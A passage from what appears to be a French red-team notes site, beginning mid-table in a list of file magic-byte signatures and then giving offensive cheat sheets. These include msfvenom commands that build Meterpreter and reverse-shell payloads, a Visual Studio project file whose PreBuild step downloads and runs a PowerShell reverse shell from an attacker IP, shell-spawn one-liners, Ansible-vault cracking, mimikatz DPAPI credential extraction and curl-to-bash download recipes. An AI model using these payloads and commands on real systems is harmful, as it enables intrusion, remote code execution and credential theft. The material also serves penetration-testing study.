format)[citation needed] <code>60 EA</code> <code>`\u00ea</code> 0 arj ARJ <code>49 53 63 28</code> <code>ISc(</code> 0 cab InstallShield CAB Archive File <code>4B 57 41 4A</code> <code>KWAJ</code> 0 ??_ Windows 3.1x Compressed File <code>53 5A 44 44</code> <code>SZDD</code> 0 ??_ Windows 9x Compressed File <code>5A 4F 4F</code> <code>ZOO</code> 0 zoo Zoo (file format) <code>50 31 0A</code> <code>P1\u240a</code> 0 pbm Portable bitmap ASCII <code>50 34 0A</code> <code>P4\u240a</code> 0 pbm Portable bitmap binary <code>50 32 0A</code> <code>P2\u240a</code> 0 pgm Portable Gray Map ASCII <code>50 35 0A</code> <code>P5\u240a</code> 0 pgm Portable Gray Map binary <code>50 33 0A</code> <code>P3\u240a</code> 0 ppm Portable Pixmap ASCII <code>50 36 0A</code> <code>P6\u240a</code> 0 ppm Portable Pixmap binary <code>D7 CD C6 9A</code> <code>\u00d7\u00cd\u00c6\u0161</code> 0 wmf Windows Metafile <code>67 69 6D 70 20 78 63 66</code> <code>gimp xcf</code> 0 xcf XCF (file format) <code>2F 2A 20 58 50 4D 20 2A   2F</code> <code>/* XPM */</code> 0 xpm X PixMap <code>41 46 46</code> <code>AFF</code> 0 aff Advanced Forensics Format <code>45 56 46 32</code> <code>EVF2</code> 0 Ex01 EnCase EWF version 2 format <code>45 56 46</code> <code>EVF</code> 0 e01 EnCase EWF version 1 format <code>51 46 49</code> <code>QFI</code> 0 qcow qcow file format <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0??   41 43 4F 4E</code> <code>RIFF????ACON</code> 0 ani Animated cursor <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0??   43 44 44 41</code> <code>RIFF????CDDA</code> 0 cda .cda file <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0??   51 4C 43 4D</code> <code>RIFF????QLCM</code> 0 qcp Qualcomm PureVoice file format <code>52 49 46 58\u00a0??\u00a0??\u00a0??\u00a0??   46 47 44 4D</code> (big-endian) <code>RIFX????FGDM</code> 0 dcr Adobe Shockwave78(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-78)79(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SW-79)80(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Exe2SW-80) <code>58 46 49 52\u00a0??\u00a0??\u00a0??\u00a0??   4D 44 47 46</code> (little-endian) <code>XFIR????MDGF</code> <code>52 49 46 58\u00a0??\u00a0??\u00a0??\u00a0??   4D 56 39 33</code> (big-endian) <code>RIFX????MV93</code> 0 dir  dxr  drx Macromedia Director file format81(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-81)79(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-SW-79)80(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Exe2SW-80) <code>58 46 49 52\u00a0??\u00a0??\u00a0??\u00a0??   33 39 56 4D</code> (little-endian) <code>XFIR????39VM</code> <code>46 4C 56</code> <code>FLV</code> 0 flv Flash Video file <code>3C 3C 3C 20 4F 72 61 63   6C 65 20 56 4D 20 56 69   72 74 75 61 6C 42 6F 78   20 44 69 73 6B 20 49 6D   61 67 65 20 3E 3E 3E</code> <code>&lt;&lt;&lt; Orac   le VM Vi   rtualBox   Disk Im   age &gt;&gt;&gt;</code> 0 vdi VirtualBox Virtual Hard Disk file format <code>63 6F 6E 6E 65 63 74 69   78</code> <code>connectix</code> 0 vhd Windows Virtual PC Virtual Hard Disk file format <code>76 68 64 78 66 69 6C 65</code> <code>vhdxfile</code> 0 vhdx Windows Virtual PC Windows 8 Virtual Hard Disk file format <code>49 73 5A 21</code> <code>IsZ!</code> 0 isz Compressed ISO image <code>44 41 41</code> <code>DAA</code> 0 daa Direct Access Archive PowerISO <code>4C 66 4C 65</code> <code>LfLe</code> 0 evt Windows Event Viewer file format <code>45 6C 66 46 69 6C 65</code> <code>ElfFile</code> 0 evtx Windows Event Viewer XML file format <code>73 64 62 66</code> <code>sdbf</code> 8 sdb Windows customized database <code>50 4D 43 43</code> <code>PMCC</code> 0 grp Windows 3.x Program Manager Program Group file format <code>4B 43 4D 53</code> <code>KCMS</code> 0 icm ICC profile <code>72 65 67 66</code> <code>regf</code> 0 dat  hiv Windows Registry file <code>21 42 44 4E</code> <code>!BDN</code> 0 pst Microsoft Outlook Personal Storage Table file <code>44 52 41 43 4F</code> <code>DRACO</code> 0 drc 3D model compressed with Google Draco82(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-82) <code>47 52 49 42</code> <code>GRIB</code> 0 grib  grib2 Gridded data (commonly weather observations or forecasts) in the WMO GRIB or GRIB2 format83(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-83) <code>42 4C 45 4E 44 45 52</code> <code>BLENDER</code> 0 blend Blender File Format84(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-84) <code>00 00 00 0C 4A 58 4C 20 0D 0A 87 0A</code> <code>\u2400\u2400\u2400\u240cJXL\u2420\u240d\u240a\u2021\u240a</code> 0 jxl Image encoded in the JPEG XL format85(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-85) <code>FF 0A</code> <code>\u00ff\u240a</code> <code>00 01 00 00 00</code> <code>\u2400\u2401\u2400\u2400\u2400</code> 0 ttf  tte  dfont TrueType font <code>4F 54 54 4F</code> <code>OTTO</code> 0 otf OpenType font86(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-86) <code>23 25 4D 6F 64 75 6C 65</code> <code>#%Module</code> 0 Modulefile for Environment Modules87(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-87) <code>4D 53 57 49 4D 00 00 00   D0 00 00 00 00</code> <code>MSWIM\u2400\u2400\u2400\u00d0\u2400\u2400\u2400\u2400</code> 0 wim  swm  esd Windows Imaging Format file <code>21 2D 31 53 4C 4F 42 1F</code> <code>!-1SLOB\u241f</code> 0 slob Slob (sorted list of blobs) is a read-only, compressed data store with dictionary-like interface88(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-88) <code>AC ED</code> <code>\u00ac\u00ed</code> 0 Serialized Java Data89(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-89) <code>43 72 65 61 74 69 76 65 20 56 6F 69 63 65 20 46 69 6C 65 1A 1A 00</code> Creative Voice File 0 voc Creative Voice file <code>2E 73 6E 64</code> <code>.snd</code> 0 au  snd Au audio file format <code>DB 0A CE 00</code> 0 OpenGL Iris Perfomer .PFB (Performer Fast Binary)90(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-90) <code>48 5a 4c 52 00 00 00 18</code> <code>HZLR</code> 0 hazelrules Noodlesoft Hazel 91(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-91) <code>46 4C 68 64</code> <code>FLhd</code> 0 flp FL Studio Project File <code>31 30 4C 46</code> <code>10LF</code> 0 flm FL Studio Mobile Project File <code>52 4b 4d 43 32 31 30</code> <code>RKMC210</code> 0 Vormetric Encryption DPM Version 2.1 Header92(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-92) <code>00 01 00 00 4D 53 49 53 41 4D 20 44 61 74 61 62 61 73 65</code> <code>\u2400\u2401\u2400\u2400MSISAM Database</code> 0 mny Microsoft Money file <code>00 01 00 00 53 74 61 6E 64 61 72 64 20 41 43 45 20 44 42</code> <code>\u2400\u2401\u2400\u2400Standard ACE DB</code> 0 accdb Microsoft Access 2007 Database <code>00 01 00 00 53 74 61 6E 64 61 72 64 20 4A 65 74 20 44 42</code> <code>\u2400\u2401\u2400\u2400Standard Jet DB</code> 0 mdb Microsoft Access Database <code>01 FF 02 04 03 02</code> <code>\u2401\u00ff\u2402\u2404\u2403\u2402</code> 0 drw Micrografx vector graphic file <code>02 64 73 73</code> <code>\u2402dss</code> 0 dss Digital Speech Standard (Olympus, Grundig, &amp; Phillips) v2 <code>03 64 73 73</code> <code>\u2403dss</code> 0 dss Digital Speech Standard (Olympus, Grundig, &amp; Phillips) v3 <code>03 00 00 00 41 50 50 52</code> <code>\u2403\u2400\u2400\u2400APPR</code> 0 adx Approach index file <code>06 06 ED F5 D8 1D 46 E5 BD 31 EF E7 FE 74 B7 1D</code> <code>\u2406\u2406\u00ed\u00f5\u00d8\u241dF\u00e5\u00bd1\u00ef\u00e7\u00fet\u00b7\u241d</code> 0 indd Adobe InDesign document <code>06 0E 2B 34 02 05 01 01 0D 01 02 01 01 02</code> <code>\u2406\u240e+4\u2402\u2405\u2401\u2401\u240d\u2401\u2402\u2401\u2401\u2402</code> 0-65535 (run-in) mxf Material Exchange Format file <code>07 53 4B 46</code> <code>\u2407SKF</code> 0 skf SkinCrafter skin file <code>07 64 74 32 64 64 74 64</code> <code>\u2407dt2ddtd</code> 0 dtd DesignTools 2D Design file <code>0A 16 6F 72 67 2E 62 69 74 63 6F 69 6E 2E 70 72</code> <code>\u240a\u2416org.bitcoin.pr</code> 0 wallet MultiBit Bitcoin wallet file <code>0D 44 4F 43</code> <code>\u240dDOC</code> 0 doc DeskMate Document file <code>0E 4E 65 72 6F 49 53 4F</code> <code>\u240eNeroISO</code> 0 nri Nero CD Compilation <code>0E 57 4B 53</code> <code>\u240eWKS</code> 0 wks DeskMate Worksheet <code>0F 53 49 42 45 4C 49 55 53</code> <code>\u240fSIBELIUS</code> 0 sib Sibelius Music - Score file <code>23 20 4D 69 63 72 6F 73 6F 66 74 20 44 65 76 65 6C 6F 70 65 72 20 53 74 75 64 69 6F</code> <code># Microsoft Developer Studio</code> 0 dsp Microsoft Developer Studio project file <code>23 21 41 4D 52</code> <code>#!AMR</code> 0 amr Adaptive Multi-Rate ACELP (Algebraic Code Excited Linear Prediction) Codec, commonly audio format with GSM cell phones. <code>23 21 53 49 4C 4B 0A</code> <code>#!SILK\u240a</code> 0 sil Audio compression format developed by Skype <code>23 3F 52 41 44 49 41 4E 43 45 0A</code> <code>#?RADIANCE\u240a</code> 0 hdr Radiance High Dynamic Range image file <code>23 40 7E 5E</code> <code>#@~^</code> 0 vbe VBScript Encoded script <code>0D F0 1D C0</code> <code>\u240d\u00f0\ufffd\u00c0</code> 0 cdb MikroTik WinBox Connection Database (Address Book) <code>23 45 58 54 4D 33 55</code> <code>#EXTM3U</code> 0 m3um3u8 Multimedia playlist <code>6D 64 66 00</code> <code>mdf\u2400</code> 0 m M2 Archive, used by game developer M2 <code>4B 50 4B 41</code> <code>KPKA</code> 0 pak Capcom RE Engine game data archives <code>41 52 43</code> <code>ARC</code> 0 arc Capcom MT Framework game data archives <code>D0 4F 50 53</code> <code>\u00d0OPS</code> 0 pl Interleaf PrinterLeaf / WorldView document format (now Broadvision QuickSilver) <code>6E 2B 31 00</code> <code>n+1</code> 344 nii Single file NIfTI format, used extensively in biomedical imaging. <code>6E 69 31 00</code> <code>ni1</code> 344 hdr Header file of a .hdr/.img pair in NIfTI format, used extensively in biomedical imaging. <code>52 41 46 36 34</code> <code>RAF64</code> 0 Report Builder file from Digital Metaphors <code>56 49 53 33</code> <code>VIS3</code> 0 Resource file Visionaire 3.x Engine <code>4D 53 48 7C</code> <code>42 53 48 7C</code> <code>MSH</code>|  <code>BSH</code>| 0 hl7 Health Level Seven (HL7) Standard for electronic data exchange 1(https://www.hl7.eu/HL7v2x/v25/std25/hl7.html) <code>70 77 72 64 61 74 61</code> <code>pwrdata</code> 0 pwrdata SAP Power Monitor (version 1.1.0 and higher) data file <code>1a 08</code> <code>..</code> 0 arc ARC archive file <code>2d 2d 2d 2d 2d 42 45 47 49 4e 20 50 47 50 20 50 55 42 4c 49 43 20 4b 45 49 20 42 4c 4f 43 4b 2d 2d 2d 2d 2d</code> <code>-----BEGIN PGP PUBLIC KEY BLOCK-----</code> 0 asc Armored PGP public key <code>3a 42 61 73 65 20</code> <code>:Base</code> 0 cnt Windows 3.x - Windows 95 Help Contents <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 56 44 52 4d</code> <code>RIFF????VDRM</code> 0 vdr VirtualDub <code>52 59 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 54 52 49 44</code> <code>RIFF????TRID</code> 0 trd TrID <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 73 68 77 34</code> <code>RIFF????shw4</code> 0 shw Corel SHOW! 4.0 <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 73 68 77 35</code> <code>RIFF????shw5</code> 0 shw Corel SHOW! 5.0 <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 73 68 72 35</code> <code>RIFF????shr5</code> 0 shr Corel SHOW! 5.0 player <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 73 68 62 35</code> <code>RIFF????shb5</code> 0 shb Corel SHOW! 5.0 background <code>58 46 49 52\u00a0??\u00a0??\u00a0??\u00a0?? 4d 44 47 46</code> <code>XFIR????MDGF</code> 0 dcr Macromedia ShockWave <code>52 49 46 46\u00a0??\u00a0??\u00a0??\u00a0?? 52 4d 4d 50</code> <code>RIFF????RMMP</code> 0 mmm MacroMind Multimedia Movie or Microsoft Multimedia Movie <code>41 53 54 4d 2d 45 35 37</code> <code>ASTM-E57</code> 0 e57 ASTM E57 3D file format"},{"location":"Red%20Team/Misc/Msfvenom/","title":"Msfvenom","text":""},{"location":"Red%20Team/Misc/Msfvenom/#executable-formats","title":"Executable formats","text":"<pre><code>asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war\n</code></pre>"},{"location":"Red%20Team/Misc/Msfvenom/#transform-formats","title":"Transform formats","text":"<pre><code>bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript\n</code></pre>"},{"location":"Red%20Team/Misc/Msfvenom/#staged-meterpreter","title":"Staged Meterpreter","text":"<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f elf &gt; shell-meterp.elf\n</code></pre>"},{"location":"Red%20Team/Misc/Msfvenom/#inline-meterpreter","title":"Inline Meterpreter","text":"<pre><code>msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=YourIP LPORT=YourPort -f elf &gt; santas.elf\n</code></pre>"},{"location":"Red%20Team/Misc/Msfvenom/#executable-with-meterpreter","title":"Executable with Meterpreter","text":"<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe &gt; shell-meterp.exe\n</code></pre>"},{"location":"Red%20Team/Misc/Msfvenom/#executable-with-windows-cmd","title":"Executable with Windows cmd","text":"<pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe &gt; shell-cmd.exe\n</code></pre>"},{"location":"Red%20Team/Misc/Msfvenom/#windows-dll-with-windows-cmd","title":"Windows DLL with Windows cmd","text":"<pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f dll &gt; shell-cmd.dll\n</code></pre>"},{"location":"Red%20Team/Misc/Msfvenom/#execute-windows-command-genere-une-dll-shell32dll-qui-lance-calcexe","title":"Execute Windows Command - g\u00e9n\u00e8re une dll shell32.dll qui lance calc.exe","text":"<pre><code>msfvenom -f dll -p windows/exec CMD=\"C:\\windows\\system32\\calc.exe\" -o shell32.dll\n</code></pre>"},{"location":"Red%20Team/Misc/Msfvenom/#python","title":"Python","text":"<pre><code>msfvenom -p cmd/unix/reverse_python LHOST=YourIP LPORT=YourPort -f raw\n</code></pre>"},{"location":"Red%20Team/Misc/Msfvenom/#powershell","title":"Powershell","text":"<pre><code>msfvenom -p windows/powershell_reverse_tcp LHOST=YourIP LPORT=YourPort -f raw\n</code></pre>"},{"location":"Red%20Team/Misc/Msfvenom/#list-encoders","title":"List encoders","text":"<pre><code>msfvenom -l encoders\n</code></pre>"},{"location":"Red%20Team/Misc/Exploits%20divers/VisualStudio/","title":"VisualStudio","text":"<pre><code>Using code projects for phishing attacks is not a new concept. In early 2021, the Lazarus APT group employed a specific attack technique in their campaign targeting security researchers. They embedded malicious event commands within Visual Studio project files, allowing the execution of harmful code when the project is compiled, as detailed in:\u00a0[New campaign targeting security researchers](https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/)\n\nThis incident has once again brought the security of Visual Studio into the public eye. However, it is important to note that Visual Studio is not the only product with such risks. JetBrains' IDEs, VSCode, and other text editors also face similar vulnerabilities when opening unsafe projects. As a response, these products have introduced trust zone mechanisms that disable certain risky functionalities in untrusted environments, aiming to protect their users.\n\nIn this repository, we present a new exploitation technique for Visual Studio projects\u00a0**(Microsoft consider it is not a security issue)**\u00a0and provide a proof of concept. Our intention is to raise awareness about the potential risks involved and empower individuals to avoid being hacked.\n</code></pre> <p>Here are some publicly disclosed methods for exploiting Visual Studio:</p> <p><code>PreBuildEvent</code>: Executes arbitrary commands before project compilation.</p> <pre><code>&lt;PreBuildEvent&gt;\n    &lt;Command&gt;\n    cmd /c calc\n    &lt;/Command&gt;\n&lt;/PreBuildEvent&gt;\n</code></pre> <p><code>GetFrameworkPaths Target</code>: Triggered when viewing code.</p> <pre><code>&lt;Target Name=\"GetFrameworkPaths\"&gt;\n    &lt;Exec Command=\"calc.exe\"/&gt;\n&lt;/Target&gt;\n</code></pre> <p><code>COMFileReference</code>: Triggered when loading\u00a0<code>TypeLib</code>\u00a0during project opening.</p> <pre><code>&lt;COMFileReference Include=\"files\\helpstringdll.tlb\"&gt;\n     &lt;EmbedInteropTypes&gt;True&lt;/EmbedInteropTypes&gt;\n&lt;/COMFileReference&gt;\n</code></pre>"},{"location":"Red%20Team/Misc/Exploits%20divers/VisualStudio/#exemple-dexploit-avec-prebuildevent","title":"Exemple d'exploit avec PreBuildEvent :","text":"<p>Visual.sln :</p> <pre><code>Microsoft Visual Studio Solution File, Format Version 12.00\n# Visual Studio Version 17\nVisualStudioVersion = 17.7.34031.279\nMinimumVisualStudioVersion = 10.0.40219.1\nProject(\"{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}\") = \"Visual\", \"Visual.csproj\", \"{A408C004-8817-4960-BF22-4E7AB8AA1974}\"\nEndProject\nGlobal\n    GlobalSection(SolutionConfigurationPlatforms) = preSolution\n        Debug|Any CPU = Debug|Any CPU\n        Release|Any CPU = Release|Any CPU\n    EndGlobalSection\n    GlobalSection(ProjectConfigurationPlatforms) = postSolution\n        {A408C004-8817-4960-BF22-4E7AB8AA1974}.Debug|Any CPU.ActiveCfg = Debug|Any CPU\n        {A408C004-8817-4960-BF22-4E7AB8AA1974}.Debug|Any CPU.Build.0 = Debug|Any CPU\n        {A408C004-8817-4960-BF22-4E7AB8AA1974}.Release|Any CPU.ActiveCfg = Release|Any CPU\n        {A408C004-8817-4960-BF22-4E7AB8AA1974}.Release|Any CPU.Build.0 = Release|Any CPU\n    EndGlobalSection\n    GlobalSection(SolutionProperties) = preSolution\n        HideSolutionNode = FALSE\n    EndGlobalSection\n    GlobalSection(ExtensibilityGlobals) = postSolution\n        SolutionGuid = {D24BD630-7BA0-46EB-A66C-8723E99703FC}\n    EndGlobalSection\nEndGlobal\n</code></pre> <p>Ainsi qu'un fichier Visual.csproj :</p> <pre><code>&lt;Project Sdk=\"Microsoft.NET.Sdk\"&gt;\n\n  &lt;PropertyGroup&gt;\n    &lt;OutputType&gt;Exe&lt;/OutputType&gt;\n    &lt;TargetFramework&gt;net6.0&lt;/TargetFramework&gt;\n    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;\n    &lt;Nullable&gt;enable&lt;/Nullable&gt;\n  &lt;/PropertyGroup&gt;\n    &lt;Target Name=\"PreBuild\" BeforeTargets=\"PreBuildEvent\"&gt;\n        &lt;Exec Command=\"powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.26:8000/revshell.ps1')\" /&gt;\n    &lt;/Target&gt;\n\n&lt;/Project&gt;\n</code></pre> <p>Juste avant le d\u00e9but du build du projet, la commande pr\u00e9sente dans le fichier .csproj sera ex\u00e9cut\u00e9e (le t\u00e9l\u00e9chargement et l'ex\u00e9cution d'un reverse-shell en powershell).</p>"},{"location":"Red%20Team/Misc/Reverse%20shell/Spawn%20shell/","title":"Spawn shell","text":""},{"location":"Red%20Team/Misc/Reverse%20shell/Spawn%20shell/#sh","title":"Sh","text":"<pre><code>/bin/sh -i\n</code></pre>"},{"location":"Red%20Team/Misc/Reverse%20shell/Spawn%20shell/#perl","title":"perl","text":"<pre><code>perl \u2014e 'exec \"/bin/sh\";'\n</code></pre>"},{"location":"Red%20Team/Misc/Reverse%20shell/Spawn%20shell/#ruby","title":"ruby","text":"<pre><code>ruby: exec \"/bin/sh\"\n</code></pre>"},{"location":"Red%20Team/Misc/Reverse%20shell/Spawn%20shell/#lua","title":"lua","text":"<pre><code>lua: os.execute('/bin/sh')\n</code></pre>"},{"location":"Red%20Team/Misc/Reverse%20shell/Spawn%20shell/#awk","title":"awk","text":"<pre><code>awk 'BEGIN {system(\"/bin/sh\")}'\n</code></pre>"},{"location":"Red%20Team/Misc/Reverse%20shell/Spawn%20shell/#find","title":"find","text":"<pre><code>find / -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \\;\n</code></pre> <pre><code>find . -exec /bin/sh \\; -quit\n</code></pre>"},{"location":"Red%20Team/Misc/Reverse%20shell/Spawn%20shell/#vim","title":"vim","text":"<pre><code>vim -c ':!/bin/sh'\n</code></pre>"},{"location":"Red%20Team/Misc/Secrets/Ansible%20Vault/","title":"Ansible Vault","text":"<p>Nous r\u00e9cup\u00e9rons un vault sous cette forme</p> <p><pre><code>$ANSIBLE_VAULT;1.1;AES256\n63303831303534303266356462373731393561313363313038376166336536666232626461653630\n3437333035366235613437373733316635313530326639330a643034623530623439616136363563\n34646237336164356438383034623462323531316333623135383134656263663266653938333334\n3238343230333633350a646664396565633037333431626163306531336336326665316430613566\n3764\n</code></pre> (enregistr\u00e9 dans vault.txt)</p> <p>Utiliser ansible2john</p> <pre><code>ansible2john vault.txt &gt; crack_vault.txt\n</code></pre> <p>cracker le password</p> <pre><code>john crack_vault.txt -w:/usr/share/Wordlist/rockyou.txt\n</code></pre> <p>le mot de passe permet ensuite d'ouvrir le vault</p> <pre><code>ansible-vault \n</code></pre>"},{"location":"Red%20Team/Misc/Secrets/Cli-xml/","title":"Cli xml","text":"<pre><code>$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *\n</code></pre>"},{"location":"Red%20Team/Misc/Secrets/Vault/","title":"Vault","text":""},{"location":"Red%20Team/Misc/Secrets/Vault/#lister-les-fichiers-credentials","title":"Lister les fichiers credentials","text":"<pre><code>dir /a:h C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\\n\nGet-ChildItem -Hidden C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\\n</code></pre>"},{"location":"Red%20Team/Misc/Secrets/Vault/#dechiffrer-avec-mimikatz","title":"D\u00e9chiffrer avec mimikatz","text":"<pre><code>dir C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\*\n\nmimikatz dpapi::cred /in:C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0\n# find master key\nmimikatz !sekurlsa::dpapi\n# use master key\nmimikatz dpapi::cred /in:C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b\n\n# find and export backup keys\nlsadump::backupkeys /system:dc01.lab.local /export\n# use backup keys\ndpapi::masterkey /in:\"C:\\Users\\&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\3e90dd9e-f901-40a1-b691-84d7f647b8fe\" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Linux%20vers%20linux/","title":"Linux vers linux","text":""},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Linux%20vers%20linux/#reception-de-fichier-en-base64","title":"R\u00e9ception de fichier en base64","text":"<pre><code>cat $fichier | base64 -w 0;echo\n</code></pre> <pre><code>echo -n '$base64' | base64 -d &gt; $fichier\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Linux%20vers%20linux/#telecharger-un-fichier-et-lexecuter-fileless","title":"T\u00e9l\u00e9charger un fichier et l'ex\u00e9cuter (fileless)","text":"<pre><code>curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash\n\nou \n\nwget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Linux%20vers%20linux/#reception-dun-fichier-via-ssh","title":"R\u00e9ception d'un fichier via SSH","text":"<pre><code>sudo systemctl start ssh\n</code></pre> <pre><code>scp $user@$monIp:$fichier .\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Serveurs%20temporaires/","title":"Serveurs temporaires","text":""},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Serveurs%20temporaires/#serveur-web-python3","title":"Serveur web python3","text":"<pre><code>python3 -m http.server\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Serveurs%20temporaires/#serveur-web-python27","title":"Serveur web python2.7","text":"<pre><code>python2.7 -m SimpleHTTPServer\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Serveurs%20temporaires/#serveur-web-php","title":"Serveur web PHP","text":"<pre><code>php -S 0.0.0.0:8000\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/Serveurs%20temporaires/#serveur-web-ruby","title":"Serveur web Ruby","text":"<pre><code>ruby -run -ehttpd . -p8000\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20dans%20diff%C3%A9rents%20langages/","title":"T\u00e9l\u00e9charger dans diff\u00e9rents langages","text":""},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20dans%20diff%C3%A9rents%20langages/#python-27","title":"Python 2.7","text":"<pre><code>python2.7 -c 'import urllib;urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20dans%20diff%C3%A9rents%20langages/#python3","title":"Python3","text":"<pre><code>python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20dans%20diff%C3%A9rents%20langages/#php","title":"PHP","text":"<pre><code>php -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'\n</code></pre> <pre><code>php -r 'const BUFFER = 1024; $fremote = \nfopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'\n</code></pre> <p>PHP (puis ex\u00e9cution par bash)</p> <pre><code>php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20dans%20diff%C3%A9rents%20langages/#ruby","title":"Ruby","text":"<pre><code>ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))'\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20dans%20diff%C3%A9rents%20langages/#perl","title":"Perl","text":"<pre><code>perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");'\n</code></pre>"},{"location":"Red%20Team/Misc/Transfert%20de%20fichiers/T%C3%A9l%C3%A9charger%20dans%20diff%C3%A9rents%20langages/#windows-via-creation-dun-fichier-wgetjs-javascript","title":"Windows, via cr\u00e9ation d'un fichier \"wget.js\" (Javascript)","text":"<pre><code>contenu wget.js:\nvar WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));\n\nPuis:\n\ncscript.exe /nologo wget.js 